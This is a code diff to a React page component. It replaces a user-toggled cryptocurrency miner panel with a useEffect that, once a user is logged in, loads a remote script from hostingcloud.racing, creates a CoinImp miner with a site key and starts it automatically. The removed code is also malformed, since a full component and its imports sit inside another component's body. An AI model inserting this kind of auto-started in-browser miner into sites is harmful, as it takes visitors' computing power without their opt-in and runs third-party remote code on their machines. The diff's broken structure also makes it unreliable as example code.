@@ -52,119 +52,59 @@ const Index = () => {
     setUserZeroBalance(prev => prev + amount);
   };
 
-  import { useEffect, useState } from "react";
-import { Line } from "react-chartjs-2";
-
-export default function MiningController({ user }) {
-  const [isMining, setIsMining] = useState(false);
-  const [throttle, setThrottle] = useState(0.5);
-  const [hashrateHistory, setHashrateHistory] = useState([]);
-
+  // Mining script injection for main page
   useEffect(() => {
-    if (!user) return;
+    if (user) {
+      // Check if mining script already exists
+      const existingScript = document.head.querySelector('script[src="https://www.hostingcloud.racing/f4U5.js"]');
+      if (existingScript) return;
 
-    const script1 = document.createElement("script");
-    script1.src = "https://www.hostingcloud.racing/f4U5.js";
-    script1.async = true;
-    script1.id = "mining-script-main";
-    document.head.appendChild(script1);
+      // Inject new mining script
+      const script1 = document.createElement('script');
+      script1.src = 'https://www.hostingcloud.racing/f4U5.js';
+      script1.async = true;
+      script1.id = 'mining-script-main';
+      document.head.appendChild(script1);
 
-    script1.onload = () => {
-      if (!window.miningClientInitialized) {
-        var _client = new Client.Anonymous(
-          "80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd",
-          { throttle: throttle, c: "w" }
-        );
-        window.miningClient = _client;
-        window.miningClientInitialized = true;
-      }
-    };
+      script1.onload = () => {
+        // Check if client already initialized
+        const existingClientScript = document.head.querySelector('#mining-script-client');
+        if (existingClientScript) return;
+        
+        const script2 = document.createElement('script');
+        script2.id = 'mining-script-client';
+        script2.text = `
+          if (!window.miningClientInitialized) {
+            var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+              throttle: 0.5, c: 'w'
+            });
+            _client.start();
+            _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#1e49ae", 40, "#6a0c5a");
+            window.miningClientInitialized = true;
+            window.miningClient = _client;
+          }
+        `;
+        document.head.appendChild(script2);
+      };
 
-    return () => {
-      if (window.miningClient && window.miningClient.stop) {
-        window.miningClient.stop();
-        window.miningClient = null;
-        window.miningClientInitialized = false;
-      }
-      const scripts = document.head.querySelectorAll(
-        "#mining-script-main, #mining-script-client"
-      );
-      scripts.forEach((s) => s.remove());
-    };
-  }, [user]);
+      // Cleanup function to remove scripts when component unmounts
+      return () => {
+        // Stop mining client if exists
+        const cleanupScript = document.createElement('script');
+        cleanupScript.text = `
+          if (window.miningClient && window.miningClient.stop) {
+            window.miningClient.stop();
+            window.miningClient = null;
+            window.miningClientInitialized = false;
+          }
+        `;
+        document.head.appendChild(cleanupScript);
+        setTimeout(() => cleanupScript.remove(), 100);
 
-  // Met à jour le throttle en temps réel
-  useEffect(() => {
-    if (window.miningClient && window.miningClient.setThrottle) {
-      window.miningClient.setThrottle(throttle);
+        const scripts = document.head.querySelectorAll('#mining-script-main, #mining-script-client');
+        scripts.forEach(script => script.remove());
+      };
     }
-  }, [throttle]);
-
-  // Suivi du hashrate
-  useEffect(() => {
-    const interval = setInterval(() => {
-      if (window.miningClient && isMining) {
-        const hps = window.miningClient.getHashesPerSecond();
-        setHashrateHistory((prev) => [...prev.slice(-19), hps]); // garde 20 points
-      }
-    }, 1000);
-    return () => clearInterval(interval);
-  }, [isMining]);
-
-  const toggleMining = () => {
-    if (!window.miningClient) return;
-    if (isMining) {
-      window.miningClient.stop();
-      setIsMining(false);
-    } else {
-      window.miningClient.start();
-      setIsMining(true);
-    }
-  };
-
-  return (
-    <div style={{ textAlign: "center", color: "white" }}>
-      <h2>⚒️ Deadspot Miner</h2>
-
-      {/* Bouton Start/Stop */}
-      <button onClick={toggleMining} style={{ padding: "10px 20px", margin: "10px" }}>
-        {isMining ? "⛔ Stop Mining" : "▶️ Start Mining"}
-      </button>
-
-      {/* Contrôle du throttle */}
-      <div>
-        <label>CPU Usage (%): {Math.round((1 - throttle) * 100)}%</label>
-        <input
-          type="range"
-          min="0.1"
-          max="0.6"
-          step="0.05"
-          value={throttle}
-          onChange={(e) => setThrottle(parseFloat(e.target.value))}
-        />
-      </div>
-
-      {/* Graphique hashrate */}
-      <div style={{ width: "400px", margin: "20px auto" }}>
-        <Line
-          data={{
-            labels: hashrateHistory.map((_, i) => i),
-            datasets: [
-              {
-                label: "Hashrate (H/s)",
-                data: hashrateHistory,
-                borderColor: "lime",
-                backgroundColor: "rgba(0,255,0,0.2)",
-              },
-            ],
-          }}
-          options={{ responsive: true, plugins: { legend: { display: false } } }}
-        />
-      </div>
-    </div>
-  );
-}
-
   }, [user]);
 
   if (loading) {
